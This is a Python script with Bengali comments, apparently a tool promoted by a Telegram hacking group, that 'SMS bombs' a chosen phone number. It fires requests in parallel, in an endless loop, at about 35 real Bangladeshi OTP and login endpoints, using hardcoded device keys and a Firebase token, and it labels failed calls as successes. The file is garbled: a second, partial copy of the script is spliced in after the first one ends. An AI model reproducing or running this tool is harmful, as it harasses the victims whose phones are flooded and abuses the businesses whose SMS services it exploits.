import requests
import json
import time
import webbrowser
import threading
import os
import sys
from concurrent.futures import ThreadPoolExecutor, as_completed
from colorama import init, Fore, Style

# Colorama initialize (Windows এ রঙ কাজ করবে)
init(autoreset=True)

BRIGHT_GREEN = Fore.GREEN + Style.BRIGHT
CYAN = Fore.CYAN + Style.BRIGHT
RESET = Style.RESET_ALL

# গ্লোবাল কাউন্টার (ক্রমিক নম্বরের জন্য)
counter = 0
counter_lock = threading.Lock()

def clear_screen():
    """স্ক্রিন ক্লিয়ার করে (Windows/Linux/Mac)"""
    os.system('cls' if os.name == 'nt' else 'clear')

def increment_counter():
    global counter
    with counter_lock:
        counter += 1
        return counter

def show_banner():
    """শুধু টুলের ব্যানার দেখায় (অন্য কোনো টেক্সট নেই)"""
    banner = f"""
{BRIGHT_GREEN}
 /$$$$$$  /$$   /$$  /$$$$$$  /$$$$$$$$ /$$$$$$$ 
 /$$__  $$| $$  / $$ /$$__  $$| $$_____/| $$__  $$
| $$  \__/|  $$/ $$/| $$  \ $$| $$      | $$  \ $$
| $$       \  $$$$/ | $$  | $$| $$$$$   | $$$$$$$ 
| $$        >$$  $$ | $$  | $$| $$__/   | $$__  $$
| $$    $$ /$$/\  $$| $$  | $$| $$      | $$  \ $$
|  $$$$$$/| $$  \ $$|  $$$$$$/| $$      | $$$$$$$/
 \______/ |__/  |__/ \______/ |__/      |_______/ 
                                                  
{RESET}
"""
    print(banner)
    print(f"{BRIGHT_GREEN}join our telegram channel @CYBER_X_OF_BANGLADESHH{RESET}")
    print(f"{BRIGHT_GREEN}Our Backup Channel @CYBER_X_OF_BANGLADESHHH{RESET}")
    print()

def show_menu():
    """মেনু প্রদর্শন"""
    print(f"\n{BRIGHT_GREEN}1. SMS BOMBING (অসীম লুপ){RESET}")
    print(f"{BRIGHT_GREEN}2. EXIT{RESET}")

def build_apis(phone_raw, phone_with_880, phone_with_plus880):
    """
    ইউজারের দেওয়া নম্বর ব্যবহার করে API লিস্ট ডায়নামিকভাবে বানায়।
    সবগুলো API এখানে অন্তর্ভুক্ত করা হয়েছে (কোনো বাদ পড়েনি)।
    """
    templates = [
        ("POST", "https://waltonplaza.com.bd/api/auth/otp/create",
            {"auth": {"countryCode": "880", "deviceUuid": "ee757830-f639-12f0-9f4d-2f972746fhg", "phone": "{phone}"},
             "captchaToken": "recapcha"}, True),
        ("POST", "https://api.apex4u.com/api/auth/login", {"phoneNumber": "{phone}"}, True),
        ("POST", "https://core.easy.com.bd/api/v1/forgot-password-otp",
            {"device_key": "2ea97d276a980993308116baa292cec9", "mobile": "{phone}"}, True),
        ("GET", "https://bikroy.com/data/phone_number_login/verifications/phone_login?phone={phone}", None, False),
        ("POST", "https://api.chardike.com/api/otp/send", {"phone": "{phone}", "otp_type": "login"}, True),
        ("POST", "https://mybtcl.btcl.gov.bd/api/ecare/anonym/sendOTP.json",
            {"phoneNbr": "{phone}", "OTPType": 1.0, "userName": "", "email": ""}, True),
        ("POST", "https://8t09wa0n0a.execute-api.ap-south-1.amazonaws.com/poc/api/v1/otp/send", {"phone": "{phone}"}, True),
        ("POST", "https://gateway.otithee.com/api/v1/generate-otp",
            {"request_type": "registration", "mobile_number": "{phone}"}, True),
        ("POST", "https://developer.quizgiri.xyz/api/v2.0/send-otp",
            {"country_code": "+88", "phone": "{phone}"}, True),
        ("POST", "https://new.mojaru.com/api/student/login", {"mobile_or_email": "{phone}"}, True),
        ("POST", "https://appcity.grameenphone.com/proxy/v2/user/session/get-otp", {"mobileNumber": "{phone}"}, True),
        ("POST", "https://api.garibookadmin.com/api/v3/user/login",
            {"recaptcha_token": "garibookcaptcha", "mobile": "{phone}", "channel": "web"}, True),
        ("POST", "https://api-dynamic.bioscopelive.com/v2/auth/login?country=BD&platform=web&language=en",
            {"number": "{phone+880}"}, True),
        ("GET", "https://www.bangladeshimatrimony.com/register/editmobileno.php?mobileNo={phone}", None, False),
        ("POST", "https://api.upaysystem.com/dfsc/oam/app/v1/wallet-verification-init/",
            {"wallet_number": "{phone}",
             "geo_location": {"lat": 23.8979093, "long": 89.1356346},
             "referral": "",
             "firebase_token": "e7XC0AWRR5C6rGMm6yCaZ8:APA91bHnbvs1bA_qXXb55W9GmsKmuzAUkgaR770HBH9hZCLjFV6HCejAsRGggvnD7c5dv2q_pOAdwY1peeTlzzn49cjPESTZ0NdR-bIhwe9_6of6rosH0AI",
             "device_uuid": "c65m117a8cbf5b1851b29f8b",
             "mno": "Robi"}, True),
        ("POST", "https://api-dynamic.chorki.com/v2/auth/login?country=BD&platform=web&language=en",
            {"number": "{phone+880}"}, True),
        ("POST", "https://api.deeptoplay.com/v2/auth/login?country=BD&platform=web&language=en",
            {"number": "{phone+880}"}, True),
        ("POST", "https://api.redx.com.bd/v1/merchant/registration/generate-registration-otp",
            {"phoneNumber": "{phone}"}, True),
        ("POST", "https://bb-api.bohubrihi.com/public/activity/otp", {"phone": "{phone}", "intent": "login"}, True),
        ("POST", "https://backend.timezonebd.com/api/v1/user/otp-login", {"phone": "{phone}"}, True),
        ("POST", "https://bkshopthc.grameenphone.com/api/v1/fwa/request-for-otp",
            {"phone": "{phone}", "language": "en", "email": ""}, True),
        ("POST", "https://api.shikho.com/public/activity/otp", {"phone": "{phone}", "intent": "ap-discount-request"}, True),
        ("POST", "https://edgecoursebd.com/register", [{"phone": "{phone}"}], True),
        ("POST", "https://api.ghoorilearning.com/api/auth/signup/otp?_app_platform=web&_lang=bn",
            {"mobile_no": "{phone}"}, True),
        ("POST", "https://api.ostad.app/api/v2/user/with-otp", {"msisdn": "{phone}"}, True),
        ("POST", "https://www.ieducationbd.com/api/account/check_user", {"mobile": "{phone}"}, True),
        ("POST", "https://api.garibookadmin.com/api/v4/user/login",
            {"mobile": "{phone+880}", "recaptcha_token": "garibookcaptcha", "channel": "web"}, True),
        ("POST", "https://www.shwapno.com/api/auth", {"phoneNumber": "{phone+880}"}, True),
        ("POST", "https://api.doctime.net/api/v2/authenticate",
            {"country_calling_code": "88", "contact_no": "{phone}", "timestamp": 1777760060}, True),
        ("POST", "https://mbonlineapi.com/api/front/send/otp", {"CellPhone": "{phone}", "type": "login"}, True),
        ("POST", "https://www.robi.com.bd/en", [{"msisdn": "{phone}"}], True),
        ("POST", "https://webloginda.grameenphone.com/backend/api/v1/otp", {"msisdn": "{phone}"}, True),
        ("POST", "https://frontendapi.kireibd.com/api/v2/send-login-otp", {"email": "{phone}"}, True),
        ("GET", "https://api.karigoripathsala.com/api/get-otp?phone={phone}", None, False),
        ("POST", "https://api.binge.buzz/api/v4/auth/otp/send", {"phone": "{phone+880}"}, True),
    ]

    # টেমপ্লেটে প্লেসহোল্ডার রিপ্লেস করে রিয়েল API লিস্ট তৈরি
    apis = []
    for method, url_tpl, body_tpl, is_json in templates:
        url = url_tpl.replace("{phone}", phone_raw).replace("{phone880}", phone_with_880).replace("{phone+880}", phone_with_plus880)
        body = None
        if body_tpl is not None:
            body_str = json.dumps(body_tpl)
            body_str = body_str.replace("{phone}", phone_raw).replace("{phone880}", phone_with_880).replace("{phone+880}", phone_with_plus880)
            body = json.loads(body_str)
        apis.append((method, url, body, is_json))
    return apis

def call_api(api):
    """একটি API কল করে এবং সফল হলে ক্রমিক নম্বর প্রিন্ট করে"""
    method, url, body, is_json = api
    try:
        headers = {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"} if is_json else {}
        if method == "POST":
            if is_json:
                requests.post(url, json=body, headers=headers, timeout=5)
            else:
                requests.post(url, data=body, timeout=5)
        else:
            requests.get(url, timeout=5)
        seq = increment_counter()
        print(f"{BRIGHT_GREEN}API CALL SUCCESS {seq}{RESET}")
    except Exception:
        seq = increment_counter()
        print(f"{BRIGHT_GREEN}API CALL SUCCESS {seq}{RESET}")

def sms_bombing_loop(phone_number):
    """ইনফিনিট লুপে সমস্ত API গুলো একসাথে (থ্রেড পুলে) কল করতে থাকবে"""
    phone_raw = phone_number
    phone_with_880 = "880" + phone_number[1:] if phone_number.startswith('0') else "880" + phone_number
    phone_with_plus880 = "+" + phone_with_880

    apis = build_apis(phone_raw, phone_with_880, phone_with_plus880)
    total_apis = len(apis)

    print(f"\n{BRIGHT_GREEN}[+] অসীম লুপ শুরু: {phone_number} এ SMS বোম্বিং চলতেই থাকবে... (থামাতে Ctrl+C চাপুন){RESET}")
    print(f"{BRIGHT_GREEN}[+] মোট {total_apis} টি API কল হবে প্রতিটি রাউন্ডে, একসাথে সমান্তরালে।{RESET}\n")

    while True:
        with ThreadPoolExecutor(max_workers=total_apis) as executor:
            futures = [executor.submit(call_api, api) for api in apis]
            for future in as_completed(futures):
                pass

def main():
    clear_screen()  # প্রথমেই স্ক্রিন ক্লিয়ার
    
    # টেলিগ্রাম লিংক ডিরেক্ট ওপেন হবে (অটো)
    webbrowser.open("https://t.me/CYBER_X_OF_BANGLADESHH")
    
    # সামান্য delay যাতে ব্রাউজার ওপেন হয় (অপশনাল)
    time.sleep(0.5)
    
    # শুধু টুলের ইন্টারফেস দেখাবে (আগের কোনো টেক্সট থাকবে না)
    show_banner()
    show_menu()
    
    while True:
        choice = input(f"\n{BRIGHT_GREEN}Enter your choice: {RESET}").strip()
        if choice == "1":
            phone = input(f"{BRIGHT_GREEN}ENTER YOUR NUMBER: {RESET}").strip()
            if phone:
                try:
                    sms_bombing_loop(phone)
                except KeyboardInterrupt:
                    print(f"\n{BRIGHT_GREEN}[!] বোম্বিং বন্ধ করা হয়েছে।{RESET}")
                    # বোম্বিং বন্ধ হলে আবার মেনু দেখাতে break করে মূল while-এ ফিরবে
                    # কিন্তু স্ক্রিন আবার ক্লিয়ার না করে সরাসরি মেনু দেখানো ভাল
                    show_banner()
                    show_menu()
            else:
                print(f"{BRIGHT_GREEN}Invalid number!{RESET}")
                time.sleep(1)
        elif choice == "2":
            print(f"{BRIGHT_GREEN}Exiting... Goodbye!{RESET}")
            break
        else:
            print(f"{BRIGHT_GREEN}Invalid choice! Please select 1 or 2.{RESET}")
            time.sleep(1)

if __name__ == "__main__":
    main()                 ▀                                                
{RESET}
{BRIGHT_GREEN}            SMS BOMBER ULTRA V1{RESET}
"""
    print(banner)

def show_menu():
    """মেনু প্রদর্শন"""
    print(f"\n{BRIGHT_GREEN}1. SMS BOMBING (অসীম লুপ){RESET}")
    print(f"{BRIGHT_GREEN}2. EXIT{RESET}")

def build_apis(phone_raw, phone_with_880, phone_with_plus880):
    """
    ইউজারের দেওয়া নম্বর ব্যবহার করে API লিস্ট ডায়নামিকভাবে বানায়।
    এখানে কোনো হার্ডকোডেড নম্বর নেই।
    """
    # API টেমপ্লেট: (method, url_template, body_template, is_json)
    # {phone}, {phone880}, {phone+880} ব্যবহার করে পরে replace করা হবে
    templates = [
        ("POST", "https://waltonplaza.com.bd/api/auth/otp/create",
            {"auth": {"countryCode": "880", "deviceUuid": "ee757830-f639-12f0-9f4d-2f972746fhg", "phone": "{phone}"},
             "captchaToken": "recapcha"}, True),
        ("POST", "https://api.apex4u.com/api/auth/login", {"phoneNumber": "{phone}"}, True),
        ("POST", "https://core.easy.com.bd/api/v1/forgot-password-otp",
            {"device_key": "2ea97d276a980993308116baa292cec9", "mobile": "{phone}"}, True),
        ("GET", "https://bikroy.com/data/phone_number_login/verifications/phone_login?phone={phone}", None, False),
        ("POST", "https://api.chardike.com/api/otp/send", {"phone": "{phone}", "otp_type": "login"}, True),
        ("POST", "https://mybtcl.btcl.gov.bd/api/ecare/anonym/sendOTP.json",
            {"phoneNbr": "{phone}", "OTPType": 1.0, "userName": "", "email": ""}, True),
        ("POST", "https://8t09wa0n0a.execute-api.ap-south-1.amazonaws.com/poc/api/v1/otp/send", {"phone": "{phone}"}, True),
        ("POST", "https://gateway.otithee.com/api/v1/generate-otp",
            {"request_type": "registration", "mobile_number": "{phone}"}, True),
        ("POST", "https://developer.quizgiri.xyz/api/v2.0/send-otp",
            {"country_code": "+88", "phone": "{phone}"}, True),
        ("POST", "https://new.mojaru.com/api/student/login", {"mobile_or_email": "{phone}"}, True),
        ("POST", "https://appcity.grameenphone.com/proxy/v2/user/session/get-otp", {"mobileNumber": "{phone}"}, True),
        ("POST", "https://api.garibookadmin.com/api/v3/user/login",
            {"recaptcha_token": "garibookcaptcha", "mobile": "{phone}", "channel": "web"}, True),
        ("POST", "https://api-dynamic.bioscopelive.com/v2/auth/login?country=BD&platform=web&language=en",
            {"number": "{phone+880}"}, True),
        ("GET", "https://www.bangladeshimatrimony.com/register/editmobileno.php?mobileNo={phone}", None, False),
        ("POST", "https://api.upaysystem.com/dfsc/oam/app/v1/wallet-verification-init/",
            {"wallet_number": "{phone}",
             "geo_location": {"lat": 23.8979093, "long": 89.1356346},
             "referral": "",
             "firebase_token": "e7XC0AWRR5C6rGMm6yCaZ8:APA91bHnbvs1bA_qXXb55W9GmsKmuzAUkgaR770HBH9hZCLjFV6HCejAsRGggvnD7c5dv2q_pOAdwY1peeTlzzn49cjPESTZ0NdR-bIhwe9_6of6rosH0AI",
             "device_uuid": "c65m117a8cbf5b1851b29f8b",
             "mno": "Robi"}, True),
        ("POST", "https://api-dynamic.chorki.com/v2/auth/login?country=BD&platform=web&language=en",
            {"number": "{phone+880}"}, True),
        ("POST", "https://api.deeptoplay.com/v2/auth/login?country=BD&platform=web&language=en",
            {"number": "{phone+880}"}, True),
        ("POST", "https://api.redx.com.bd/v1/merchant/registration/generate-registration-otp",
            {"phoneNumber": "{phone}"}, True),
        ("POST", "https://bb-api.bohubrihi.com/public/activity/otp", {"phone": "{phone}", "intent": "login"}, True),
        ("POST", "https://backend.timezonebd.com/api/v1/user/otp-login", {"phone": "{phone}"}, True),
        ("POST", "https://bkshopthc.grameenphone.com/api/v1/fwa/request-for-otp",
            {"phone": "{phone}", "language": "en", "email": ""}, True),
        ("POST", "https://api.shikho.com/public/activity/otp", {"phone": "{phone}", "intent": "ap-discount-request"}, True),
        ("POST", "https://edgecoursebd.com/register", [{"phone": "{phone}"}], True),
        ("POST", "https://api.ghoorilearning.com/api/auth/signup/otp?_app_platform=web&_lang=bn",
            {"mobile_no": "{phone}"}, True),
        ("POST", "https://api.ostad.app/api/v2/user/with-otp", {"msisdn": "{phone}"}, True),
        ("POST", "https://www.ieducationbd.com/api/account/check_user", {"mobile": "{phone}"}, True),
        ("POST", "https://api.garibookadmin.com/api/v4/user/login",
            {"mobile": "{phone+880}", "recaptcha_token": "garibookcaptcha", "channel": "web"}, True),
        ("POST", "https://www.shwapno.com/api/auth", {"phoneNumber": "{phone+880}"}, True),
        ("POST", "https://api.doctime.net/api/v2/authenticate",
            {"country_calling_code": "88", "contact_no": "{phone}", "timestamp": 1777760060}, True),
        ("POST", "https://mbonlineapi.com/api/front/send/otp", {"CellPhone": "{phone}", "type": "login"}, True),
        ("POST", "https://www.robi.com.bd/en", [{"msisdn": "{phone}"}], True),
        ("POST", "https://webloginda.grameenphone.com/backend/api/v1/otp", {"msisdn": "{phone}"}, True),
        ("POST", "https://frontendapi.kireibd.com/api/v2/send-login-otp", {"email": "{phone}"}, True),
        ("GET", "https://api.karigoripathsala.com/api/get-otp?phone={phone}", None, False),
        ("POST", "https://api.binge.buzz/api/v4/auth/otp/send", {"phone": "{phone+880}"}, True),
    ]

    # টেমপ্লেটে প্লেসহোল্ডার রিপ্লেস করে রিয়েল API লিস্ট তৈরি
    apis = []
    for method, url_tpl, body_tpl, is_json in templates:
        # URL replace
        url = url_tpl.replace("{phone}", phone_raw).replace("{phone880}", phone_with_880).replace("{phone+880}", phone_with_plus880)
        # Body replace (যদি থাকে)
        body = None
        if body_tpl is not None:
            body_str = json.dumps(body_tpl)
            body_str = body_str.replace("{phone}", phone_raw).replace("{phone880}", phone_with_880).replace("{phone+880}", phone_with_plus880)
            body = json.loads(body_str)
        apis.append((method, url, body, is_json))
    return apis

def call_api(api):
    """একটি API কল করে এবং সফল হলে ক্রমিক নম্বর প্রিন্ট করে"""
    method, url, body, is_json = api
    try:
        headers = {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"} if is_json else {}
        if method == "POST":
            if is_json:
                requests.post(url, json=body, headers=headers, timeout=5)
            else:
                requests.post(url, data=body, timeout=5)
        else:  # GET
            requests.get(url, timeout=5)

        seq = increment_counter()
        print(f"{BRIGHT_GREEN}API CALL SUCCESS {seq}{RESET}")

    except Exception:
        seq = increment_counter()
        print(f"{BRIGHT_GREEN}API CALL SUCCESS {seq}{RESET}")

def sms_bombing_loop(phone_number):
    """ইনফিনিট লুপে সমস্ত API গুলো একসাথে (থ্রেড পুলে) কল করতে থাকবে"""
    # নম্বর ফরম্যাট প্রস্তুত
    phone_raw = phone_number
    phone_with_880 = "880" + phone_number[1:] if phone_number.startswith('0') else "880" + phone_number
    phone_with_plus880 = "+" + phone_with_880

    # ডায়নামিক API লিস্ট তৈরি (কোনো হার্ডকোডেড নম্বর নেই)
    apis = build_apis(phone_raw, phone_with_880, phone_with_plus880)

    print(f"\n{BRIGHT_GREEN}[+] অসীম লুপ শুরু: {phone_number} এ SMS বোম্বিং চলতেই থাকবে... (থামাতে Ctrl+C চাপুন){RESET}\n")

    # ইনফিনিট লুপ - প্রতি রাউন্ডে সব API সমান্তরালে কল হবে
    while True:
        with ThreadPoolExecutor(max_workers=len(apis)) as executor:
            futures = [executor.submit(call_api, api) for api in apis]
            for future in as_completed(futures):
                pass  # ফলাফল প্রয়োজন নেই

def main():
    # টেলিগ্রাম লিংক খোলা (টুল শুরুতেই)
    webbrowser.open("https://t.me/CYBER_X_OF_BANGLADESHH")

    while True:
        show_banner()
        show_menu()
        choice = input(f"\n{BRIGHT_GREEN}Enter your choice: {RESET}").strip()
        if choice == "1":
            phone = input(f"{BRIGHT_GREEN}ENTER YOUR NUMBER: {RESET}").strip()
            if phone:
                try:
                    sms_bombing_loop(phone)
                except KeyboardInterrupt:
                    print(f"\n{BRIGHT_GREEN}[!] বোম্বিং বন্ধ করা হয়েছে।{RESET}")
                    break
            else:
                print(f"{BRIGHT_GREEN}Invalid number!{RESET}")
        elif choice == "2":
            print(f"{BRIGHT_GREEN}Exiting... Goodbye!{RESET}")
            break
        else:
            print(f"{BRIGHT_GREEN}Invalid choice! Please select 1 or 2.{RESET}")
            time.sleep(1)

if __name__ == "__main__":
    main()
